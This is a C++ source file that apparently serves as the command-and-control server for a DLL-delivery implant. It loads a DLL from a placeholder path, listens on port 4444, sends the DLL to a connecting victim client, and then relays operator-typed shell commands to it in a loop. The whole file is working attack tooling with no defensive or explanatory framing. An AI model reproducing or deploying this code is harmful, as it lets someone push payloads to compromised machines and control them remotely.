#include <iostream>
#include <unistd.h>
#include <arpa/inet.h>
#include <fstream>

#define error(str) std::cout << "[-] " << str << std::endl
#define success(str) std::cout << "[+] " << str << std::endl
#define info(str) std::cout << "[*] " << str << std::endl

int main()
{
	const char* file_path = "<PATH TO DLL>";


	std::ifstream file(file_path, std::ios::binary);
	if (file.fail())
	{
		error("Unable to open file");
		return 0;
	}

	file.seekg(0, file.end);
	int file_size = file.tellg();
	file.seekg(0, file.beg);

	char buffer[file_size];
	file.read(buffer, file_size);

	if (file)
	{
		info("File copied into memory");
	}
	else
	{
		error("Error reading file into memory");
		file.close();
		return 0;
	}
	file.close();

	int serverfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("0.0.0.0");

	int enable = 1;
	setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));

	if (bind(serverfd, (sockaddr*)&addr, sizeof(addr)) != 0)
	{
		error("Unable to bind to socket");
		return 0;
	}
	info("Socket binded to port");

	listen(serverfd, 2);
	int clientfd = accept(serverfd, NULL, NULL);

	int bytes_sent = 0;
	while(bytes_sent < file_size)
	{
		bytes_sent += send(clientfd, buffer + bytes_sent, sizeof(buffer), 0);
	}
	close(clientfd);
	success("File sent to server!");
	info("Waiting for reconnection");

	clientfd = accept(serverfd, NULL, NULL);

	std::string input;
	while(true)
	{
		std::cout << "cmd> ";
		std::getline(std::cin, input);
		send(clientfd, input.c_str(), input.length() + 1, 0);
		if (input == "exit")
			break;
	}
	info("Closeing server");

	close(clientfd);
	close(serverfd);
	return 0;
}
